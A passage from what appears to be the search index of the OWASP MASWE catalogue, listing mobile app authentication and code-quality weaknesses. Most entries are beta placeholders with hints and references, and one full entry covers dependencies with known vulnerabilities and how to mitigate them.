Apple/Google</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0036/#references","title":"References","text":"<ul> <li>https://developers.google.com/identity/blockstore/android?hl=en</li> <li>https://cloud.google.com/docs/authentication/best-practices-applications#semi-trusted_or_restricted_environments</li> <li>https://cloud.google.com/docs/authentication/best-practices-applications#security_considerations</li> <li>https://developer.apple.com/documentation/signinwithapplerestapi</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0036/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-storage-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0037/","title":"MASWE-0037: Authentication Material Sent over Insecure Connections","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0037</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0037/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>General authentication best practice.</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0037/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>session IDs</li> <li>tokens</li> <li>passwords</li> <li>API keys</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0037/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-network-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0038/","title":"MASWE-0038: Authentication Tokens Not Validated","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0038</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0038/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. oauth2/jwt client-side checks</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0038/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>code grant</li> <li>expiration</li> <li>none algorithm</li> <li>PKCE</li> <li>implicit grant</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0038/#references","title":"References","text":"<ul> <li>https://developers.google.com/identity/sign-in/android/backend-auth#verify-the-integrity-of-the-id-token</li> <li>https://developers.google.com/identity/protocols/oauth2/openid-connect#validatinganidtoken</li> <li>https://developer.apple.com/documentation/sign_in_with_apple/generate_and_validate_tokens</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0038/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-code-4","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0039/","title":"MASWE-0039: Shared Web Credentials and Website-association Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0039</p>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-platform-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0039/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Best practice for sharing credentials between apps and their website counterparts.</p>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-platform-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0039/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Website-association</li> <li>Shared Web Credentials</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-platform-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0039/#references","title":"References","text":"<ul> <li>https://developer.apple.com/documentation/security/shared_web_credentials</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-platform-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0039/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-auth-1","masvs-platform-1","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0040/","title":"MASWE-0040: Insecure Authentication in WebViews","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0040</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-platform-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0040/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. via WebView.getHttpAuthUsernamePassword / WebViewClient.onReceivedHttpAuthRequest</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-platform-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0040/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Using WebView.getHttpAuthUsernamePassword / WebViewClient.onReceivedHttpAuthRequest</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-platform-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0040/#references","title":"References","text":"<ul> <li>https://developer.android.com/reference/android/webkit/WebView#getHttpAuthUsernamePassword(java.lang.String,%20java.lang.String)</li> <li>https://developer.android.com/reference/android/webkit/WebViewClient#onReceivedHttpAuthRequest(android.webkit.WebView,%20android.webkit.HttpAuthHandler,%20java.lang.String,%20java.lang.String)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-platform-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0040/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-1","masvs-platform-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0041/","title":"MASWE-0041: Authentication Enforced Only Locally Instead of on the Server-side","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0041</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0041/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>General authentication best practice. Only for apps with connection. The app performs local authentication involving the remote endpoint and according to the platform best practices.</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0041/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>(IEEE) Since client-side security controls are capable of being invaded, authentication and authorization controls should be implemented on the server-side.</li> <li>biometry only used as part of MFA authentication and not as the only auth method</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0041/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0017 - Testing Confirm Credentials (android)</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0042/","title":"MASWE-0042: Authorization Enforced Only Locally Instead of on the Server-side","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0042</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0042/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>General authentication best practice. Only for apps with connection.</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0042/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Authorization Enforced Locally</li> <li>use of oauth</li> <li>use of SharedWebcredentials</li> <li>use of WebAuthn/ASAuthorization</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0042/#references","title":"References","text":"<ul> <li>https://developers.google.com/identity/smartlock-passwords/android/associate-apps-and-sites</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0042/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L1","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0043/","title":"MASWE-0043: App Custom PIN Not Bound to Platform KeyStore","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0043</p>","tags":["android","ios","L2","maswe","masvs-auth-2","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0043/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>It's better to use the OS Local Auth / bind to a key stored in the platform KeyStore. Consider new title App Custom Password Not Bound to Platform KeyStore where password could be password or PIN.</p>","tags":["android","ios","L2","maswe","masvs-auth-2","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0043/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>use the OS Local Auth</li> <li>binding to keys stored in the platform KeyStore</li> <li>https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/applicationpassword</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-2","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0043/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-auth-2","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0044/","title":"MASWE-0044: Biometric Authentication Can Be Bypassed","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0044</p>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0044/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>It should be based on unlock platform KeyStore / crypto, use CryptoObject</p>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0044/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>no use of CryptoObject</li> <li>keychain items protected with access control flags such as kSecAccessControlTouchIDAny or kSecAccessControlTouchIDCurrentSet</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0044/#references","title":"References","text":"<ul> <li>https://developer.android.com/training/sign-in/biometric-auth#crypto</li> <li>https://labs.withsecure.com/publications/how-secure-is-your-android-keystore-authentication</li> <li>https://developer.apple.com/documentation/localauthentication/accessing_keychain_items_with_face_id_or_touch_id</li> <li>https://github.com/sensepost/objection/issues/136#issuecomment-419664574</li> <li>https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0044/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0018 - Testing Biometric Authentication (android)</li> <li>MASTG-TEST-0064 - Testing Biometric Authentication (ios)</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0044/#tests","title":"Tests","text":"<p> MASTG-TEST-0266: References to APIs for Event-Bound Biometric Authentication  MASTG-TEST-0267: Runtime Use Of Event-Bound Biometric Authentication </p>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0045/","title":"MASWE-0045: Fallback to Non-biometric Credentials Allowed for Sensitive Transactions","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0045</p>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0045/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. via DEVICE_CREDENTIAL on Android and LAPolicy.deviceOwnerAuthentication on iOS</p>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0045/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>DEVICE_CREDENTIAL on Android</li> <li>LAPolicy.deviceOwnerAuthentication on iOS</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0045/#references","title":"References","text":"<ul> <li>https://developer.android.com/training/sign-in/biometric-auth#allow-fallback</li> <li>https://developer.apple.com/documentation/localauthentication/logging_a_user_into_your_app_with_face_id_or_touch_id#3148834</li> <li>https://developer.apple.com/documentation/localauthentication/lapolicy/deviceownerauthenticationwithbiometrics/</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0045/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0045/#tests","title":"Tests","text":"<p> MASTG-TEST-0268: References to APIs Allowing Fallback to Non-Biometric Authentication  MASTG-TEST-0269: Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication </p>","tags":["android","ios","L2","maswe","masvs-auth-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0046/","title":"MASWE-0046: Crypto Keys Not Invalidated on New Biometric Enrollment","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0046</p>","tags":["android","ios","L2","maswe","masvs-auth-2","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0046/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Biometric related crypto keys should be is invalidated by default whenever new biometric enrollments are added.</p>","tags":["android","ios","L2","maswe","masvs-auth-2","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0046/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>Enabled by default on Android but can be disabled by calling <code>setInvalidatedByBiometricEnrollment(false)</code></li> <li>Disabled by default on iOS but can be enabled using <code>SecAccessControlCreateFlags.biometryCurrentSet</code> (prev. <code>touchIDCurrentSet</code>) when setting access control (since iOS 9). This invalidates keychain items when a fingerprint is added or removed. See kSecAccessControlTouchIDCurrentSet, biometryCurrentSet.</li> </ul>","tags":["android","ios","L2","maswe","masvs-auth-2","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0046/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-auth-2","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-AUTH/MASWE-0046/#tests","title":"Tests","text":"<p> MASTG-TEST-0271: Runtime Use Of APIs Detecting Biometric Enrollment Changes  MASTG-TEST-0270: References to APIs Detecting Biometric Enrollment Changes </p>","tags":["android","ios","L2","maswe","masvs-auth-2","masvs-crypto-2","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0075/","title":"MASWE-0075: Enforced Updating Not Implemented","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0075</p>","tags":["android","ios","L2","maswe","masvs-code-2","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0075/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>Check if the app enforces updates e.g. via AppUpdateManager on Android or itunes check on app version on iOS. However, the backend would be enforcing this and not only the app locally.</p>","tags":["android","ios","L2","maswe","masvs-code-2","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0075/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>The in\u2011app update mechanism isn't used at all (CWE-693).</li> <li>The update enforcement occurs purely locally (client\u2011side) without server\u2011side checks (CWE-602).</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-2","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0075/#references","title":"References","text":"<ul> <li>https://developer.android.com/guide/playcore/in-app-updates</li> <li>https://developer.android.com/reference/com/google/android/play/core/appupdate/AppUpdateManager</li> <li>https://medium.com/swlh/updating-users-to-the-latest-app-release-on-ios-ed96e4c76705</li> <li>https://gist.github.com/DineshKachhot/f63fcebceca6351fc982cafd38f6f05c</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-2","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0075/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<ul> <li>MASTG-TEST-0036 - Testing Enforced Updating (android)</li> <li>MASTG-TEST-0080 - Testing Enforced Updating (ios)</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-2","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0076/","title":"MASWE-0076: Dependencies with Known Vulnerabilities","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p>","tags":["android","ios","L1","L2","maswe","masvs-code-3"]},{"location":"MASWE/MASVS-CODE/MASWE-0076/#overview","title":"Overview","text":"<p>Mobile apps often depend on third-party libraries, software development kits (SDKs), or frameworks, either open-source components maintained by the community or closed-source products provided by commercial vendors, to implement functionality, streamline development, or integrate platform services.</p> <p>When these dependencies contain vulnerabilities, they can be more easily exploited than vulnerabilities in first-party code because these vulnerabilities (and some exploits) are often documented in public databases, such as the CVE list, or accessible through security advisories.</p> <p>The developer is responsible for ensuring all dependencies are secure and up to date because they are part of the app's codebase and therefore extend the app's attack surface. Google and Apple emphasize this in their security best practices:</p> <p>Google's Using SDKs safely and securely</p> <p>\"If you include an SDK in your app, you are responsible for ensuring that their third-party code and practices are compliant with Google Play Developer Program Policies and do not cause your app to violate policies.\"</p> <p>Apple's App Store Review Guidelines</p> <p>\"You are responsible for making sure everything in your app complies with these guidelines, including ad networks, analytics services, and third-party SDKs, so review and choose them carefully.\"</p> <p>In terms of privacy, dependencies can introduce risks if they collect or transmit user data without proper consent or transparency. Both Google and Apple require third-party SDKs used in apps to comply with their privacy policies and guidelines to ensure user data is handled securely and transparently. It is the developer's responsibility to ensure that any third-party libraries or SDKs used in the app adhere to these requirements, even if the libraries themselves are not under their direct control and even if they don't use the specific code that could violate the platform's policies.</p> <p>Google's Using SDKs safely and securely</p> <p>\"App developers are required to treat any data collection from within their app by an SDK as if they collected it directly.\"</p> <p>Apple's Third-party SDK requirements</p> <p>\"When you use a third-party SDK with your app, you are responsible for all the code the SDK includes in your app, and need to be aware of its data collection and use practices.</p> <p>For more information on privacy and data collection declarations, see  Inadequate Data Collection Declarations.</p>","tags":["android","ios","L1","L2","maswe","masvs-code-3"]},{"location":"MASWE/MASVS-CODE/MASWE-0076/#impact","title":"Impact","text":"<p>Using dependencies with known vulnerabilities in mobile apps can result in various security risks, including but not limited to:</p> <ul> <li>Sensitive Data Exposure: Vulnerable dependencies may be exploited to bypass access controls or cryptographic protections, which could lead to the exposure of sensitive user data, including credentials, session tokens, and personally identifiable information (PII). This can result in data breaches, which can have legal, financial and reputational consequences.</li> <li>Execution of Unauthorized Code or Privilege Escalation: Exploitable vulnerabilities in embedded dependencies can allow attackers to execute arbitrary code within the app's context (e.g., through code injection), escalate privileges, or manipulate app behavior. The overall impact can range from full compromise of user accounts, abuse of backend services or persistent access to protected resources. The business impact can be severe, including financial loss, service disruption, and damage to customer trust.</li> <li>Regulatory and Policy Non-Compliance: Including dependencies with publicly known CVEs may violate regulatory requirements (e.g., GDPR, HIPAA, PCI-DSS) or platform security policies (e.g., Google Play or App Store guidelines). Failure to update or remediate such vulnerabilities can result in app rejection, fines, or mandatory disclosures.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-3"]},{"location":"MASWE/MASVS-CODE/MASWE-0076/#modes-of-introduction","title":"Modes of Introduction","text":"<ul> <li>Direct Dependencies: Vulnerable dependencies can be introduced into the app either manually (by copying and linking source or binary files) or more commonly via package managers and build tools (e.g., Gradle, CocoaPods, Swift Package Manager). This includes both first- and third-party SDKs, and may involve both statically and dynamically linked libraries.</li> <li>Transitive Dependencies: Dependencies can be pulled in indirectly through other libraries or SDKs that the app uses. This means that an app may still be affected by a vulnerable library if one of its dependencies includes it, even if the app does not directly include the library itself.</li> <li>Dynamically Loaded Dependencies: Some libraries may be dynamically loaded at runtime, which can make it difficult to track and manage dependencies. This can lead to situations where a vulnerable version of a library is used without the developer's knowledge.</li> <li>Outdated Platform Security Components: Mobile apps may depend on platform-provided security components, such as cryptographic libraries or SSL/TLS implementations. If these components are outdated or lack timely updates, they can introduce known vulnerabilities into the application. For instance, on Android, the system's security provider responsible for secure network communications must be explicitly updated by the developer at app startup.</li> <li>Usage of Third-Party Frameworks: Applications may be built in a third-party application framework such as Flutter or React Native. The framework itself, as well as any platform-specific bindings may contain vulnerabilities.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-3"]},{"location":"MASWE/MASVS-CODE/MASWE-0076/#mitigations","title":"Mitigations","text":"<ul> <li>Use a Software Bill of Materials (SBOM): Produce and maintain an SBOM to track all components and transitive dependencies, ensuring visibility and accountability for third-party code. See NIST SSDF (NIST SP 800-218) PS.3.2, NTIA The Minimum Elements For a Software Bill of Materials (SBOM), CISA SBOM Types document for more information on SBOMs and their importance in managing software dependencies.</li> <li>Update Dependencies Responsibly: As part of secure dependency management, regularly monitor all used third-party dependencies for security-related updates (for example, by using Software Composition Analysis (SCA) tools and SBOMs in your CI/CD pipelines). Apply updates when they fix known vulnerabilities, and pin versions explicitly to prevent unexpected changes and reduce the risk of supply-chain attacks.</li> <li>Remove Unused or Obsolete Dependencies: Periodically review and eliminate unused, legacy, or unnecessary libraries to reduce the app's attack surface and dependency footprint.</li> <li>Use Trusted Sources: Only include libraries and SDKs from reputable sources, such as official repositories or well-maintained open-source projects, to minimize the risk of introducing malicious or vulnerable code.</li> </ul>","tags":["android","ios","L1","L2","maswe","masvs-code-3"]},{"location":"MASWE/MASVS-CODE/MASWE-0076/#tests","title":"Tests","text":"<p> MASTG-TEST-0272: Identify Dependencies with Known Vulnerabilities in the Android Project  MASTG-TEST-0274: Dependencies with Known Vulnerabilities in the App's SBOM  MASTG-TEST-0275: Dependencies with Known Vulnerabilities in the App's SBOM  MASTG-TEST-0273: Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts </p>","tags":["android","ios","L1","L2","maswe","masvs-code-3"]},{"location":"MASWE/MASVS-CODE/MASWE-0077/","title":"MASWE-0077: Running on a recent Platform Version Not Ensured","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0077</p>","tags":["android","ios","L2","maswe","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0077/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>e.g. via minSdkVersion on Android and MinimumOSVersion on iOS. with this we Ensure services/components availability (MASVS-STORAGE-1), also the NSC/ATS availability - Android &gt; 7.0 / iOS &gt; 9.0 (MASVS-NETWORK-1) and WebView secure config (MASVS-PLATFORM-2).</p>","tags":["android","ios","L2","maswe","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0077/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>The app sets a low minimum OS version to support older devices, but still relies, implicitly or explicitly, on security features (e.g., runtime permissions, hardware-backed keystore, network security policies) that may not exist on those versions (CWE-693 and CWE-1357).</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0077/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0077/#tests","title":"Tests","text":"<p> MASTG-TEST-0245: References to Platform Version APIs </p>","tags":["android","ios","L2","maswe","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0078/","title":"MASWE-0078: Latest Platform Version Not Targeted","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that weakness by following our guidelines.</p> <p> Check our GitHub Issues for MASWE-0078</p>","tags":["android","ios","L2","maswe","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0078/#initial-description-or-hints","title":"Initial Description or Hints","text":"<p>The app does not target the latest platform version (e.g., via targetSdkVersion on Android or by using an older Xcode/toolchain), and as a result, misses out on the most recent platform-enforced security protections (e.g., scoped storage, permission auto-reset, modern TLS handling) (CWE-693 and CWE-1357).</p>","tags":["android","ios","L2","maswe","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0078/#relevant-topics","title":"Relevant Topics","text":"<ul> <li>targetSDK on Android</li> <li>XCode version on iOS</li> </ul>","tags":["android","ios","L2","maswe","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0078/#mastg-v1-coverage","title":"MASTG v1 Coverage","text":"<p>No MASTG v1 tests are related to this weakness.</p>","tags":["android","ios","L2","maswe","masvs-code-1","placeholder"]},{"location":"MASWE/MASVS-CODE/MASWE-0079/","title":"MASWE-0079: Unsafe Handling of Data from the Network","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> <p>Placeholder Weakness</p> <p>This weakness 